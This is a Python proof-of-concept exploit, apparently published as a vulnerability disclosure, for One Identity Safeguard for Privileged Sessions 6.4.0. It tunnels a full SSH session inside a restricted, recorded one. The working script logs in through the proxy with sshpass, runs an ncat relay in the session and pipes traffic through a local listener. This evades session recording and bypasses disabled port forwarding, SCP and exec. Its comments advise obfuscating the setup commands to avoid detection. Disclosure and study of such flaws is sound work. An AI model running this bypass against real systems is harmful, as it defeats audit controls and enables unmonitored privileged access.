#!/usr/bin/env python3
#
# Safeguard SSH restriction bypass -- Proof of Concept
#
# Copyright (c) 2020 Bence SZIGETI <bence.szigeti@gohyda.com>
# All rights reserved.
#
# Affected product:  One Identity LLC, Safeguard for Privileged Sessions
# Tested versions:   6.4.0[*]
# Type:              - authenticated
#                    - privilege restriction bypass
#                    - stealth traffic
#
# [*]: Design issue, older/newer versions are probably affected.
#
# Issue description
# =================
#
# One Identity Safeguard for Privileged Sessions 6.4.0 allows attackers
# to bypass the intended recording functionality (and bypass feature
# restrictions) by creating an SSH connection in a tunnel within the
# original privileged SSH session.
#
# Technical description
# =====================
#
# One Identity Safeguard for Privileged Sessions has the ability to
# proxy SSH sessions with recording and feature restrictions.
#
# One scenario (useful for home office) when the user only able to open
# terminal sessions -- there is no "Session Exec", port- and X11
# forward, etc feature.  But, because the user
#
#   - can run commands over the shell session;
#   - can exchange data over the shell session standard I/O;
#
# the user is able to open -- for example -- an embedded TCP tunnel.
# The tunnel then can be used for a feature rich SSH session, without
# restrictions, and without giving cleartext visibility to the observer.
#
# The PoC requires at least "only terminal sessions" privilege, and by
# creating an embedded SSH tunnel:
#
#   - the traffic is encrypted, cleartext can not be recorded;
#   - disabled port forwarding bypassed;
#   - disabled 'Session Exec' bypassed;
#   - disabled SCP bypassed;
#   - etc.
#
# PoC usage
# =========
#
# Fill the variables below.  Run the script.  Grab the printed SSH
# command and run it: with modifications, like port forwarding.  Enjoy.
#
# NOTE
# ====
#
# The commands which are run directly in the privileged SSH session (for
# setup) MUST be obfuscated to avoid detection.  Also, it would make the
# detection harder if the embedded tunnel protocol (like SSH) would not
# reveal itself -- this can be achieved with the TCP tunnel encryption.
# But, these are not in scope for this PoC.

import socket
import subprocess
import threading

# TCP tunnel to the final target.
listen_host = "127.0.0.1"
listen_port = 1202

# The Safeguard proxy.
safeguard_ssh_gateway = "172.29.0.1"

# Legal Safeguard target.  Accessible over Safeguard.
jump_host = "10.0.0.1"
jump_port = 22
jump_username = "gohyda"
jump_password = "******"

# Final target (from the jump host).  Inaccessible directly.
target_host = "127.0.0.1"
target_port = 22

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((listen_host, listen_port))
s.listen(1)
print("[+] Example SSH access: `ssh -p %d %s@%s`" % (listen_port,
                                                     jump_username,
                                                     listen_host))
conn, addr = s.accept()

proc = subprocess.Popen(
    'sshpass -p "%s" ssh -t -t -p %d "%s@%s@%s"'
        % (jump_password,
           jump_port,
           jump_username,
           jump_host,
           safeguard_ssh_gateway),
    shell=True,
    stdout=subprocess.PIPE,
    stdin=subprocess.PIPE)

start_token="start_token"
# Must be obfuscated (cleartext recorded):
proc.stdin.write(('stty raw -echo; echo "%s"; ncat %s %s\n'
                      % (start_token,
                         target_host,
                         target_port)).encode())
proc.stdin.flush()
while not proc.stdout.readline().strip().endswith(start_token.encode()):
    pass

print("[+] Tunnel opened.  (Disconnect is not detected!)")

def in_pipe(conn, proc):
    while True:
        conn.sendall(proc.stdout.read1(65535))

def out_pipe(conn, proc):
    while True:
        proc.stdin.write(conn.recv(65535))
        proc.stdin.flush()

i = threading.Thread(target=in_pipe, args=([conn, proc]))
o = threading.Thread(target=out_pipe, args=([conn, proc]))
i.start(); o.start()
i.join(); o.join()
